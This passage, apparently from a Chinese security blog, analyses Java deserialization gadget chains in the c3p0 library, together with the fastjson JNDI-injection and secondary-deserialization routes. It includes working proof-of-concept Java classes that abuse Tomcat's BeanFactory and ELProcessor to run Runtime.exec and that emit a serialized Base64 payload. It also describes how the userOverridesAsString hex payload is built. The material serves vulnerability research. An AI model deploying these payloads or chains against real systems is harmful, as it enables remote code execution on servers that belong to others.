                        }
                    }
                    Enumeration e = ref.getAll();
                    while (e.hasMoreElements()) {
                        ra = e.nextElement();
                        String propName = ra.getType();
                        if (propName.equals(Constants.FACTORY) ||
                            propName.equals("scope") || propName.equals("auth") ||
                            propName.equals("forceString") ||
                            propName.equals("singleton")) {
                            continue;
                        }
                        value = (String)ra.getContent();
                        Object[] valueArray = new Object[1];
                        /* Shortcut for properties with explicitly configured setter */
                        Method method = forced.get(propName);
                        if (method != null) {
                            valueArray[0] = value;
                            try {
                                method.invoke(bean, valueArray);
                            } catch (IllegalAccessException|
                              ……
                            }
                            continue;
                        }
                       ……
                    }
                    return bean;
                } catch (java.beans.IntrospectionException ie) {
                    ……
                } catch (java.lang.ReflectiveOperationException e) {
                    ……
                }
            } else {
                return null;
            }
        }
存在反射的操作。
通过`Reference` 对象 `ref`的`getClassName` 方法获取类名，然后加载类后反射创建实例
`beanClass`，需要有无参数构造器。
然后获取绑定在 `forceString` 上的 `RefAddr` 对象 `ra`,，获取该对象的值，使用 `=`
号分隔，前面的作为`key`，以后面的部分为方法名，参数列表为字符串类型来反射获取`beanClass`的`Method`，作为`value`
写入一个`HashMap`中。
接着就要遍历 `ref` 上的所有`RefAddr`对象，类型不可以是`factory scope auth forceString singleton`
根据类型从上面的哈希表里 拿到 `Method`，反射执行`Method`，参数使用`RefAddr`对象的值。
可以直接在ref中绑定两个`StringRefAddr` 。
使用`javax.el.ELProcessor` 的`eval` 方法，执行任意EL表达式。
这里有个`bracket`操作，添加了`${}` 。
demo如下。
    public class c3p0UnserDemo {
        public static void main(String[] args) throws Exception{
            RefAddr forceStringAddr = new StringRefAddr("forceString","x=eval");
            RefAddr xStringAddr = new StringRefAddr("x","''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc')");
            Reference ref = new ResourceRef("javax.el.ELProcessor",null,null,null,false);
            ref.add(forceStringAddr);
            ref.add(xStringAddr);
            ObjectFactory beanFactory = new BeanFactory();
            beanFactory.getObjectInstance(ref,null,null,null);
        }
    }
反序列化构造`Ref`时需要加上`Factory`类名，和`FactoryLocation`
    public class c3p0SerDemo {
        private static class ConnectionPool implements ConnectionPoolDataSource , Referenceable{
            protected String classFactory = null;
            protected String classFactoryLocation = null;
            public ConnectionPool(String classFactory,String classFactoryLocation){
                this.classFactory = classFactory;
                this.classFactoryLocation = classFactoryLocation;
            }
            @Override
            public Reference getReference() throws NamingException {
                RefAddr forceStringAddr = new StringRefAddr("forceString","x=eval");
                RefAddr xStringAddr = new StringRefAddr("x","''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc')");
                Reference ref = new ResourceRef("javax.el.ELProcessor",null,null,null,false,classFactory,classFactoryLocation);
                ref.add(forceStringAddr);
                ref.add(xStringAddr);
                return ref;
            }
            @Override
            public PooledConnection getPooledConnection() throws SQLException {
                return null;
            }
            @Override
            public PooledConnection getPooledConnection(String user, String password) throws SQLException {
                return null;
            }
            @Override
            public PrintWriter getLogWriter() throws SQLException {
                return null;
            }
            @Override
            public void setLogWriter(PrintWriter out) throws SQLException {
            }
            @Override
            public void setLoginTimeout(int seconds) throws SQLException {
            }
            @Override
            public int getLoginTimeout() throws SQLException {
                return 0;
            }
            @Override
            public Logger getParentLogger() throws SQLFeatureNotSupportedException {
                return null;
            }
        }
        public static void main(String[] args) throws Exception{
            Constructor constructor = Class.forName("com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase").getDeclaredConstructor();
            constructor.setAccessible(true);
            PoolBackedDataSourceBase obj = (PoolBackedDataSourceBase) constructor.newInstance();
            ConnectionPool connectionPool = new ConnectionPool("org.apache.naming.factory.BeanFactory",null);
            Field field = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
            field.setAccessible(true);
            field.set(obj, connectionPool);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(obj);
            objectOutputStream.close();
            System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));
        }
    }
具体细节看参考。
## fastjson中的利用
### jndi注入
看一下`com.mchange.v2.c3p0.JndiRefForwardingDataSource` 类
找调用了 inner() 的setter 方法。
除了设置`jndiName`属性外，再设置一下 `logWriter` 或者 `loginTimeout` 属性就行，由于`logWriter`
需要给一个`PrintWriter`对象，直接`loginTimeout`好了。
### 二次反序列化
这个链子稍微有点复杂，慢慢分析好了。
先说一下 `VetoableChangeListener` 和 `VetoableChangeSupport`
前者就是一个监听器，当`Bean`中受约束的属性改变时，就会调用监听器的`VetoableChange` 方法。
后者拥有`VetoableChangeListener`的监听器列表，并且会向监听器列表发送 `PropertyChangeEvent`
，来跟踪属性的更改情况。`PropertyChangeEvent` 存储着`Bean`某属性名的新旧值。
跟进 `com.mchange.v2.c3p0.WrapperConnectionPoolDataSource`
这个类在初始化时会调用`setUpPropertyListeners` 方法开启属性监听
该方法自定义了一个监听器，然后重写`vetoableChange` 方法
给他加载到自己的 vcs属性的监听器列表里。
在设置属性时，为了监控属性的变化，就会去调用`vcs.fireVetoableChange`
方法，此方法有很多重载，但最后都会封装一个`PropertyChangeEvent` 对象，
传递给监听器的`vetoableChange`方法。
整个流程看过来，可以发现其中最主要的，还是要看监听器的`vetoableChange` 方法如何实现。
    public void vetoableChange( PropertyChangeEvent evt ) throws PropertyVetoException
            {
                String propName = evt.getPropertyName();
                Object val = evt.getNewValue();
                if ( "connectionTesterClassName".equals( propName ) )
                {
                    try
                    { recreateConnectionTester( (String) val ); }
                    catch ( Exception e )
                    {
                        //e.printStackTrace();
                        if ( logger.isLoggable( MLevel.WARNING ) )
                        logger.log( MLevel.WARNING, "Failed to create ConnectionTester of class " + val, e );
                        throw new PropertyVetoException("Could not instantiate connection tester class with name '" + val + "'.", evt);
                    }
                }
                else if ("userOverridesAsString".equals( propName ))
                {
                    try
                    { WrapperConnectionPoolDataSource.this.userOverrides = C3P0ImplUtils.parseUserOverridesAsString( (String) val ); }
                    catch (Exception e)
                    {
                        if ( logger.isLoggable( MLevel.WARNING ) )
                        logger.log( MLevel.WARNING, "Failed to parse stringified userOverrides. " + val, e );
                        throw new PropertyVetoException("Failed to parse stringified userOverrides. " + val, evt);
                    }
                }
            }
这里只监听两个属性名，`connectionTesterClassName` 属性通过`recreateConnectionTester`
方法重新实例化一个`ConnectionTester` 对象，不可行。
`userOverridesAsString` 属性 会使用`C3P0ImplUtils.*parseUserOverridesAsString*`
来处理新值。
截取从`HexAsciiSerializedMap`后的第二位到倒数第二位 中间的hex字符串，可以构造形如
`HexAsciiSerializedMap:hex_code;` 的
解码后，开始反序列化。
攻击点就是`userOverridesAsString` 属性的setter 方法。
也不需要其他Gadget，直接拿上面的gadgets就能打。
## 参考
[http://www.yulegeyu.com/2021/10/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/](http://www.yulegeyu.com/2021/10/10/JAVA反序列化之C3P0不出网利用/)